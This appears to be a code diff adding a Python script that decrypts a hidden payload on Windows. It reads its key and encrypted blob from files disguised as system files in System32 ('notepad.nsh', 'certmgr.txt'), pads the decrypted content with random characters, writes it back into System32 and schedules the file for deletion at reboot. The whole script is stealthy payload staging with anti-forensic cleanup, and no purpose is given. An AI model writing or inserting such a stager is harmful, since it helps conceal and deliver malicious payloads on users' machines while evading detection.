@@ -1,0 +1,35 @@
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import HKDF
+from Crypto.Hash import SHA256
+import base64
+import random
+import string
+import ctypes
+
+with open("C:\\Windows\\System32\\notepad.nsh","rb") as f:
+    master_key = f.read().strip()
+with open("C:\\Windows\\System32\\certmgr.txt","r") as f:
+    enc = f.read().strip()
+
+raw = base64.b64decode(enc)
+v = raw[0:1]
+salt = raw[1:17]
+nonce = raw[17:29]
+tag = raw[29:45]
+ct = raw[45:]
+if v != b"\x01":
+    raise ValueError("version")
+
+aes_key = HKDF(master_key, 32, salt, SHA256)
+cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
+decrypted = cipher.decrypt_and_verify(ct, tag).decode()
+
+prefix = ''.join(random.choices(string.ascii_letters + string.digits, k=517))
+suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=517))
+wrapped = prefix + decrypted + suffix
+
+temp_path = "C:\\Windows\\System32\\_.txt"
+with open(temp_path, "w") as temp_file:
+    temp_file.write(wrapped)
+
+ctypes.windll.kernel32.MoveFileExW(temp_path, None, 4)
